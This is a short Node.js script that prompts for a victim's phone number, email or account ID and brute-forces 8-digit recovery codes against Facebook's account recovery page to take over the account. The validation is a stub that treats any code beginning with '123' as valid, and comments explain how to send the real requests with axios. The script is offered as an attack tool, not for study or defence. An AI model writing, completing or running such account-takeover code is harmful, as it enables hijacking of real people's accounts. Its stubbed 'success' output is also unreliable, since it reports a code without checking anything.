const readlineSync = require('readline-sync');

const MAX_ATTEMPTS = 10000;

function generateCode() {
    const digits = "0123456789";
    return Array.from({ length: 8 }, () => digits[Math.floor(Math.random() * digits.length)]).join('');
}

function bruteForceCode(targetInfo, targetUrl) {
    for (let i = 0; i < MAX_ATTEMPTS; i++) {
        const code = generateCode();
        if (checkCodeValidity(targetInfo, code, targetUrl)) {
            return code;
        }
    }
    throw new Error("No valid code found.");
}

function checkCodeValidity(targetInfo, code, targetUrl) {
    // Implement the actual code validation logic based on the provided targetInfo, code, and targetUrl
    // For demonstration purposes, assume any code starting with "123" is valid for now
    if (code.startsWith("123")) {
        // Simulate making a request to the specified URL
        console.log(`Checking code ${code} on ${targetUrl}`);
        // In a real scenario, you would use a library like axios or node-fetch to make an HTTP request
        // Example: const response = await axios.post(targetUrl, { code, targetInfo });
        return true;
    } else {
        return false;
    }
}

// Example usage:
const targetInfo = readlineSync.question("Enter the target's phone number, email, or account ID: ");
const targetUrl = "https://www.facebook.com/recover/initiate/";
try {
    const validCode = bruteForceCode(targetInfo, targetUrl);
    console.log(`The valid 8-digit code on the specified page is: ${validCode}`);
} catch (error) {
    console.error(`Error: ${error.message}`);
}
